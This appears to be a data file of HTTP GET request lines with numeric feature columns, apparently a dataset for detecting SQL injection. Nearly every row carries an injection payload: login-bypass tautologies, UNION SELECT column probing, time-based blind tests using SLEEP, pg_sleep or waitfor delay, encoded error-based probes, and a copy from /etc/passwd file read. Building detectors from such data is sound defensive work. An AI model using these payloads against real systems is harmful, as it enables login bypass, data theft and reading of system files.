93,1,200,1056,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,2821,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,4762,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,7636,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,2193,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,1487,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
93,1,200,1203,24,22,4,1,1,GET ?mail=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
116,2,200,1817,27,7,13,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21-- &name= AND 1=0 AND '%'=' HTTP/1.1
214,2,200,2541,94,10,46,1,1,GET ?mail=' or ''-'&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))# HTTP/1.1
41,1,200,7195,7,11,8,1,1,GET ?user=' or 1=1 limit 1 -- -  HTTP/1.1
41,1,200,2071,7,11,8,1,1,GET ?user=' or 1=1 limit 1 -- -  HTTP/1.1
41,1,200,7332,7,11,8,1,1,GET ?user=' or 1=1 limit 1 -- -  HTTP/1.1
41,1,200,3583,7,11,8,1,1,GET ?user=' or 1=1 limit 1 -- -  HTTP/1.1
144,2,200,4083,35,9,19,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27&tel=or SLEEP(5)-- HTTP/1.1
144,2,200,1626,46,12,20,1,1,GET ?phone=admin" --&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
117,2,200,7539,46,16,19,1,1,GET ?account=admin" #&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10# HTTP/1.1
50,6,200,7072,12,15,14,2,1,GET ?email='&&SLEEP(5)&&'1&phone=admin"/* HTTP/1.1
221,2,200,6270,137,11,22,1,1,GET ?name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &tel=") or ("a"="a HTTP/1.1
163,2,200,2194,97,6,20,1,1,GET ?id= or 1=1–&id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
109,1,200,4707,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
109,1,200,3997,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
109,1,200,3827,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
34,1,200,6241,7,11,6,1,1,GET ?user=" or sleep(5)=" HTTP/1.1
34,1,200,1711,7,11,6,1,1,GET ?user=" or sleep(5)=" HTTP/1.1
34,1,200,6272,7,11,6,1,1,GET ?user=" or sleep(5)=" HTTP/1.1
34,1,200,1915,7,11,6,1,1,GET ?user=" or sleep(5)=" HTTP/1.1
34,1,200,5967,7,11,6,1,1,GET ?user=" or sleep(5)=" HTTP/1.1
32,1,200,4097,7,10,5,1,1,GET ?username=' or 1=1– HTTP/1.1
32,1,200,6304,7,10,5,1,1,GET ?username=' or 1=1– HTTP/1.1
160,2,200,7218,30,16,23,1,1,GET ?name=admin'or 1=1 or ''='&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
31,1,200,6106,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
31,1,200,5811,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
31,1,200,7678,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
31,1,200,5561,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
31,1,200,3434,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
31,1,200,3233,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
31,1,200,7860,14,2,4,1,1,GET ?id= ORDER BY 11#  HTTP/1.1
224,2,200,4868,94,7,38,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14#&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))# HTTP/1.1
49,2,200,3969,13,15,10,1,1,GET ?email=admin' #&phone= HAVING 1=1--  HTTP/1.1
33,1,200,3717,7,6,11,1,1,GET ?user=') or '1'='1-- HTTP/1.1
33,1,200,3572,7,6,11,1,1,GET ?user=') or '1'='1-- HTTP/1.1
162,2,200,1652,66,16,36,1,1,GET ?id=';waitfor delay '0:0:5'--&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))--  HTTP/1.1
122,1,200,7513,46,8,16,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
122,1,200,7408,46,8,16,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
122,1,200,1669,46,8,16,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
32,1,200,5868,14,5,3,1,1,GET ?phone= ORDER BY 2  HTTP/1.1
32,1,200,4444,14,5,3,1,1,GET ?phone= ORDER BY 2  HTTP/1.1
32,1,200,4168,14,5,3,1,1,GET ?phone= ORDER BY 2  HTTP/1.1
133,2,200,7929,58,11,28,1,1,GET ?name=' or 1=1--&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))--  HTTP/1.1
115,2,200,6956,30,15,30,1,1,GET ?account=')) or (('x'))=(('x&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
142,2,200,7629,33,13,22,1,1,GET ?id= benchmark(3200_SHA1(1)) '&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
55,2,200,3809,7,23,14,1,1,GET ?code=') or pg_sleep(5)--&code=' or true-- HTTP/1.1
211,2,200,7567,55,8,23,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
46,2,200,4827,12,21,7,1,1,GET ?email=Time-Based:&pass=AND false HTTP/1.1
59,2,200,2294,12,20,10,1,1,GET ?username=or pg_SLEEP(5)#&pass="or 1=1 or ""=" HTTP/1.1
53,1,200,2710,13,8,7,1,1,GET ?username= AND 7506=9091 AND ('5913=5913 HTTP/1.1
53,1,200,6770,13,8,7,1,1,GET ?username= AND 7506=9091 AND ('5913=5913 HTTP/1.1
53,1,200,1670,13,8,7,1,1,GET ?username= AND 7506=9091 AND ('5913=5913 HTTP/1.1
53,1,200,4442,13,8,7,1,1,GET ?username= AND 7506=9091 AND ('5913=5913 HTTP/1.1
117,1,200,6066,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
117,1,200,4272,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
117,1,200,6428,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
117,1,200,4027,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
117,1,200,1945,21,7,5,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
64,2,200,5409,26,8,10,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_3-- &pass= ORDER BY 17#  HTTP/1.1
99,2,200,4511,30,10,18,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12-- &pass=" or ""-" HTTP/1.1
40,1,200,4147,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
40,1,200,5446,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
40,1,200,4450,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
40,1,200,1133,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
40,1,200,1164,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
40,1,200,2216,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
40,1,200,1856,7,14,5,1,1,GET ?account=admin" or "1"="1"# HTTP/1.1
119,2,200,3147,53,6,28,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7--  HTTP/1.1
135,1,200,6888,66,7,24,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118))) HTTP/1.1
135,1,200,5977,66,7,24,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118))) HTTP/1.1
135,1,200,3182,66,7,24,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118))) HTTP/1.1
135,1,200,6401,66,7,24,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118))) HTTP/1.1
124,2,200,3802,30,11,25,2,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18-- &pass=') or '1'='1'/* HTTP/1.1
69,1,200,4017,30,7,15,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
69,1,200,1658,30,7,15,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
69,1,200,5473,30,7,15,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
69,1,200,3474,30,7,15,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
69,1,200,2090,30,7,15,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
69,1,200,5674,30,7,15,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
40,1,200,1311,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
40,1,200,6707,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
40,1,200,7308,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
40,1,200,5417,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
40,1,200,2509,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
40,1,200,7151,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
40,1,200,5603,19,4,7,1,1,GET ?mail= ORDER BY SLEEP(5)--  HTTP/1.1
114,1,200,7294,31,2,12,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
114,1,200,7071,31,2,12,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
104,2,200,5040,31,21,18,1,1,GET ?username=" or pg_sleep(5)--&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7# HTTP/1.1
163,2,200,4843,53,6,26,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
235,2,200,1469,145,10,24,1,1,GET ?code= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &code=") or ("1"="1"-- HTTP/1.1
116,2,200,7178,31,9,23,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14-- &name=') or '1'='1-- HTTP/1.1
93,2,200,2403,40,13,15,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_"'3&phone= AND 7300=7300 AND 'pKlZ'='pKlY HTTP/1.1
48,2,200,7762,12,17,10,1,1,GET ?email=admin" --&phone=or SLEEP(5)# HTTP/1.1
114,2,200,5176,31,12,17,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14-- &phone=" or 1=1# HTTP/1.1
99,2,200,2786,31,13,17,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9#&pass=admin" or 1=1-- HTTP/1.1
74,2,200,5997,21,13,11,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6#&pass=admin") or ("1"="1"-- HTTP/1.1
61,2,200,6112,21,9,7,1,1,GET ?name='\"&phone= UNION ALL SELECT 1_2_3_4_5_6_7# HTTP/1.1
261,2,200,2966,121,4,52,1,1,GET ?id=-1 UNION SELECT 1 INTO @_@_@&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))--  HTTP/1.1
59,2,200,5073,7,24,9,1,1,GET ?code=admin" or 1=1#&code=admin"or 1=1 or ""=" HTTP/1.1
243,2,200,6993,104,9,39,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65)))&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
30,1,200,3824,7,10,5,1,1,GET ?password=or 1=1# HTTP/1.1
30,1,200,5523,7,10,5,1,1,GET ?password=or 1=1# HTTP/1.1
30,1,200,5269,7,10,5,1,1,GET ?password=or 1=1# HTTP/1.1
30,1,200,6531,7,10,5,1,1,GET ?password=or 1=1# HTTP/1.1
30,1,200,4931,7,10,5,1,1,GET ?password=or 1=1# HTTP/1.1
30,1,200,2625,7,10,5,1,1,GET ?password=or 1=1# HTTP/1.1
144,2,200,1208,80,10,19,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL-- &phone= ORDER BY 11  HTTP/1.1
235,2,200,1869,117,10,44,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))#&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
156,2,200,5217,69,7,21,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_3&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
34,1,200,7845,7,6,11,2,1,GET ?code=') or '1'='1'/* HTTP/1.1
34,1,200,6354,7,6,11,2,1,GET ?code=') or '1'='1'/* HTTP/1.1
34,1,200,5591,7,6,11,2,1,GET ?code=') or '1'='1'/* HTTP/1.1
136,2,200,3525,54,7,21,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14#&id= WHERE 1=1 AND 1=0# HTTP/1.1
65,1,200,7761,8,32,12,2,1,GET login/?id= and (select substring(@@version_1_1))='X' HTTP/1.1
65,1,200,4470,8,32,12,2,1,GET login/?id= and (select substring(@@version_1_1))='X' HTTP/1.1
65,1,200,3445,8,32,12,2,1,GET login/?id= and (select substring(@@version_1_1))='X' HTTP/1.1
65,1,200,6717,8,32,12,2,1,GET login/?id= and (select substring(@@version_1_1))='X' HTTP/1.1
62,1,200,3408,7,39,8,1,1,GET ?password=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3018,7,39,8,1,1,GET ?password=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2156,7,39,8,1,1,GET ?password=select current_setting('virtual_host'); HTTP/1.1
62,1,200,4029,7,39,8,1,1,GET ?password=select current_setting('virtual_host'); HTTP/1.1
50,2,200,3360,7,17,12,1,1,GET ?email=admin") or "1"="1"--&phone='*' HTTP/1.1
46,2,200,2582,7,15,9,1,1,GET ?account= or 1=1--&pass=" or ""-" HTTP/1.1
60,2,200,2378,14,19,9,1,1,GET ?username=admin") or "1"="1&pass= ORDER BY 7--  HTTP/1.1
285,2,200,7862,104,4,40,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28-- &id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65))) HTTP/1.1
38,2,200,6678,12,8,8,1,1,GET ?code=" "&code=SLEEP(5)=" HTTP/1.1
61,2,200,1672,7,23,17,1,1,GET ?name=admin') or ('1'='1'#&phone=admin" or 1=1-- HTTP/1.1
127,2,200,5554,37,9,17,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20&pass= ORDER BY 22--  HTTP/1.1
91,2,200,2551,21,10,8,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16#&pass=' or 1=1– HTTP/1.1
197,2,200,7732,55,12,19,1,1,GET ?code=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
41,2,200,6233,7,16,9,1,1,GET ?id=' or a=a–&pass=or true-- HTTP/1.1
39,1,200,7185,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
39,1,200,6568,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
39,1,200,4482,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
39,1,200,4300,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
39,1,200,7459,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
39,1,200,2086,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
39,1,200,4554,7,12,10,2,1,GET ?phone=admin' or '1'='1'/* HTTP/1.1
53,2,200,5014,7,22,9,1,1,GET ?code=" or "x"="x&code=' or user like '% HTTP/1.1
152,1,200,6493,46,5,16,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
152,1,200,5493,46,5,16,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
67,1,200,2398,21,4,4,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
67,1,200,7489,21,4,4,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
67,1,200,1232,21,4,4,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
233,2,200,6374,89,10,39,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21#&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))--  HTTP/1.1
197,2,200,5722,52,9,22,1,1,GET ?email= AND 7506=9091 AND ('5913=5913&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
26,1,200,5463,7,8,4,1,1,GET ?username=' – HTTP/1.1
26,1,200,4765,7,8,4,1,1,GET ?username=' – HTTP/1.1
26,1,200,3555,7,8,4,1,1,GET ?username=' – HTTP/1.1
72,2,200,2049,19,34,9,1,1,GET ?account=select @@microsoftversione&pass= ORDER BY SLEEP(5) HTTP/1.1
237,2,200,1359,85,12,29,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
53,2,200,1717,15,10,9,1,1,GET ?code= WHERE 1=1 AND 1=1#&code=" or ""^" HTTP/1.1
163,2,200,1144,77,9,29,1,1,GET ?name= ORDER BY 29 &phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))# HTTP/1.1
162,2,200,5051,31,29,19,1,1,GET ?code=' group by username having 1=1--&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23--  HTTP/1.1
100,2,200,3610,45,8,13,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4 HTTP/1.1
187,2,200,7574,54,6,27,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
103,2,200,6054,21,27,10,3,1,GET ?id=copy myfile from '/etc/passwd'; &id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
183,1,200,4409,86,8,34,1,1,GET ?password= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69))) HTTP/1.1
183,1,200,5942,86,8,34,1,1,GET ?password= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69))) HTTP/1.1
183,1,200,3030,86,8,34,1,1,GET ?password= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69))) HTTP/1.1
183,1,200,4125,86,8,34,1,1,GET ?password= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69))) HTTP/1.1
